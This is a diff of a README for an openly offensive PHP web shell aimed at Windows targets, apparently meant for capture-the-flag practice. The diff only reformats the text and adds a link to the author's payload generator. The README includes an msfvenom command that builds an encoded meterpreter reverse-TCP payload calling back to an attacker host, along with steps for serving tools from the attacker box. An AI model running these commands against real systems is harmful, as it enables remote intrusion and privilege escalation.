@@ -10,8 +10,10 @@
 
 Automates or simplifies many on target functions. Designed for windows targets. See it in action at https://kdgwebsolutions.com/assets/img/videos/proof-of-concept-for-learning-management-system-exploits.mp4. I have included an assortment of common windows enumeration and escalation tools.  To generate your own msfvenom payload:
 
-venom.exe : `sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACKBOXIP) LPORT=(ATTACBOXPORT) -e x64/shikata_ga_nai -f exe -o venom.exe`
-
+venom.exe : 
+```sh sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACKBOXIP) LPORT=(ATTACBOXPORT) -e x64/shikata_ga_nai -f exe -o venom.exe`
+```
+If you would prefer to use a payload generator, please give mine a try https://github.com/kaotickj/K-Sploit
 ![Screen](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshelluse.gif)
 
 ## Automates or simplifies many on target enumeration functions. Including:
@@ -63,7 +65,9 @@ It goes without saying that the effectiveness of the various functions depends o
 
 ### Footnotes:
 <sup>1</sup> I generally cd into my "windowstools" folder and start a simple http server:
-`cd windowstools`
-`python3 -m http.server 8000`.
+```sh
+cd windowstools
+python3 -m http.server 8000
+```
 ![Screen](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-listening.png)
 ![Hack The Box](http://www.hackthebox.eu/badge/image/476578)
